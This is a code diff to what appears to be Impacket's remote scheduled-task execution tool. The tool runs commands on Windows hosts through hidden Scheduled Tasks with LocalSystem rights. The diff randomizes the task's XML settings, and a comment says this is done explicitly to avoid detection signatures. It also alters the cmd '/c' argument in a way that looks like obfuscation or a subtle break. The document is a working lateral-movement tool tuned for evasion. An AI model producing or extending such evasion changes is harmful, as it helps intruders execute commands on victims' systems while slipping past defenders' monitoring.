@@ -31,7 +31,7 @@ import random
 import logging
 
 from impacket.examples import logger
-from impacket.examples.name_generators import TaskNameGenerator, FileNameGenerator
+from impacket.examples.name_generators import TaskNameGenerator, FileNameGenerator, TaskSchedulerGenerator
 from impacket import version
 from impacket.dcerpc.v5 import tsch, transport
 from impacket.dcerpc.v5.dtypes import NULL
@@ -115,20 +115,23 @@ class TSCH_EXEC:
         tmpName = TaskNameGenerator.generate()
         tmpFileName = FileNameGenerator.generate_log()
 
+        # Generate randomized task scheduler values to avoid detection signatures
+        task_config = TaskSchedulerGenerator.generate_all()
+
         if self.sessionId is not None:
             cmd, args = cmd_split(self.__command)
         else:
             cmd = "powershell.exe"
-            args = "start-Process -FilePath cmd.exe -ArgumentList @('/c','%s > %%windir%%\\Temp\\%s 2>&1')" % (self.__command, tmpFileName)
+            args = "start-Process -FilePath cmd.exe -ArgumentList @('/c,','%s > %%windir%%\\Temp\\%s 2>&1')" % (self.__command, tmpFileName)
 
         xml = """<?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <Triggers>
     <CalendarTrigger>
-      <StartBoundary>2024-07-02T21:35:13.1337324</StartBoundary>
+      <StartBoundary>%s</StartBoundary>
       <Enabled>true</Enabled>
       <ScheduleByDay>
-        <DaysInterval>1</DaysInterval>
+        <DaysInterval>%d</DaysInterval>
       </ScheduleByDay>
     </CalendarTrigger>
   </Triggers>
@@ -153,8 +156,8 @@ class TSCH_EXEC:
     <Hidden>true</Hidden>
     <RunOnlyIfIdle>false</RunOnlyIfIdle>
     <WakeToRun>false</WakeToRun>
-    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
-    <Priority>7</Priority>
+    <ExecutionTimeLimit>%s</ExecutionTimeLimit>
+    <Priority>%d</Priority>
   </Settings>
   <Actions Context="LocalSystem">
     <Exec>
@@ -163,8 +166,12 @@ class TSCH_EXEC:
     </Exec>
   </Actions>
 </Task>
-        """ % ((xml_escape(cmd) if self.__silentCommand is False else self.__command.split()[0]), 
-            (xml_escape(args) if self.__silentCommand is False else " ".join(self.__command.split()[1:])))
+        """ % (task_config['StartBoundary'],
+               task_config['DaysInterval'],
+               task_config['ExecutionTimeLimit'],
+               task_config['Priority'],
+               (xml_escape(cmd) if self.__silentCommand is False else self.__command.split()[0]),
+               (xml_escape(args) if self.__silentCommand is False else " ".join(self.__command.split()[1:])))
         taskCreated = False
 
         # Try to create task, retry with new name if task already exists
